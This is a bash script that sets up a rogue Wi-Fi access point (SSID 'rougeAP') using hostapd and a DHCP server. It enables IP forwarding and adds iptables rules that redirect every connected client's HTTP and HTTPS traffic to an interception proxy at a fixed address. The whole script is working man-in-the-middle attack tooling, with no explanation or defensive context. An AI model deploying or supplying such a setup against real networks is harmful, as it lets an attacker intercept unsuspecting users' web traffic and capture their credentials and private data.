#!/bin/bash
internalInterface=wlan0
externalInterface=eth0
proxyAddress=192.168.0.167
proxyPort=8080

apt-get update
apt-get install hostapd isc-dhcp-server

echo "interface=wlan0" > /etc/hostapd/hostapd.conf
echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
echo "logger_stdout=-1" >> /etc/hostapd/hostapd.conf
echo "logger_stdout_level=2" >> /etc/hostapd/hostapd.conf
echo "ssid=rougeAP" >> /etc/hostapd/hostapd.conf
echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
echo "channel=6" >> /etc/hostapd/hostapd.conf
echo "auth_algs=3" >> /etc/hostapd/hostapd.conf
echo "max_num_sta=5" >> /etc/hostapd/hostapd.conf
echo "wpa=2" >> /etc/hostapd/hostapd.conf
echo "wpa_passphrase=supersecretpassphrase" >> /etc/hostapd/hostapd.conf
echo "wpa_key_mgmt=WPA-PSK" >> /etc/hostapd/hostapd.conf
echo "wpa_pairwise=TKIP CCMP" >> /etc/hostapd/hostapd.conf
echo "rsn_pairwise=CCMP" >> /etc/hostapd/hostapd.conf

echo "ddns-update-style none;" > /etc/dhcp/dhcpd.conf
echo "option domain-name \"example.org\";" >> /etc/dhcp/dhcpd.conf
echo "option domain-name-servers 192.168.0.1;" >> /etc/dhcp/dhcpd.conf
echo "default-lease-time 600;" >> /etc/dhcp/dhcpd.conf
echo "max-lease-time 7200;" >> /etc/dhcp/dhcpd.conf
echo "authoritative;" >> /etc/dhcp/dhcpd.conf
echo "log-facility local7;" >> /etc/dhcp/dhcpd.conf
echo "subnet 192.168.10.0 netmask 255.255.255.0{" >> /etc/dhcp/dhcpd.conf
echo "	range 192.168.10.100 192.168.10.200;" >> /etc/dhcp/dhcpd.conf
echo "	option subnet-mask 255.255.255.0;" >> /etc/dhcp/dhcpd.conf
echo "	option broadcast-address 192.168.10.255;" >> /etc/dhcp/dhcpd.conf
echo "	option routers 192.168.10.1;" >> /etc/dhcp/dhcpd.conf
echo "}" >> /etc/dhcp/dhcpd.conf

ifconfig $internalInterface 192.168.10.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $internalInterface -p tcp --dport 80 -j DNAT --to-destination $proxyAddress:$proxyPort
iptables -t nat -A POSTROUTING  -j MASQUERADE -o $externalInterface
iptables -t nat -A PREROUTING -i $internalInterface -p tcp --dport 443 -j DNAT --to-destination $proxyAddress:$proxyPort
